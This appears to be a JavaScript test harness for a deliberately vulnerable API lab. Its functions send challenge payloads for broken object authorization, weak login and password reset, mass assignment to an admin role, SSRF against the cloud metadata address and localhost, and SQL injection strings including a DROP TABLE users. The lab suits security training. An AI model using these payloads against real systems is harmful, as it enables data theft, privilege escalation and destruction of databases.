// Challenge 1: BOLA
function testBolaUsers() { callAPI('GET', '/api/v1/users'); }
function testBolaUserId() { callAPI('GET', '/api/v1/users/1'); }
function testBolaItems() { callAPI('GET', '/api/v1/items'); }
function testBolaItemId() { callAPI('GET', '/api/v1/items/1'); }
function testBolaSecrets() { callAPI('GET', '/api/v1/secrets'); }

// Challenge 2: Auth
function postLogin() { postJSON('/api/v2/login', { username: 'admin', password: 'admin123' }); }
function postRegister() { postJSON('/api/v2/register', { username: 'attacker', password: 'hacked123', email: 'attacker@evil.com' }); }
function postReset() { postJSON('/api/v2/reset-password', { username: 'admin', new_password: 'hacked' }); }

// Challenge 3: Property Auth
function testV3Users() { callAPI('GET', '/api/v3/users'); }
function testV3UserId() { callAPI('GET', '/api/v3/users/1'); }
function updateUser() { putJSON('/api/v3/users/2', { role: 'admin', password: 'changed' }); }
function updateItem() { patchJSON('/api/v3/items/1', { price: 0 }); }

// Challenge 4: Resource
function testSearch() { callAPI('GET', '/api/v4/search?q=laptop'); }
function testExport() { callAPI('GET', '/api/v4/export'); }
function bulkAction() { postJSON('/api/v4/bulk-action', { action: 'update_price', item_ids: [1,2,3], price: 1 }); }

// Challenge 5: SSRF
function fetchURL() { postJSON('/api/v5/fetch', { url: 'http://169.254.169.254/latest/meta-data/' }); }
function proxyURL() { callAPI('GET', '/api/v5/proxy?url=http://localhost/'); }
function webhookURL() { postJSON('/api/v5/webhook', { webhook_url: 'http://internal-server/webhook' }); }

// Challenge 6: SQLi
function sqlSearch() { callAPI('GET', '/api/v6/search?q=%27%20OR%20%271%27%3D%271'); }
function sqlCustomers() { callAPI('GET', '/api/v6/customers?sort=id%20DESC%3B%20DROP%20TABLE%20users--'); }
function sqlLogin() { postJSON('/api/v6/login', { username: "admin' --", password: 'anything' }); }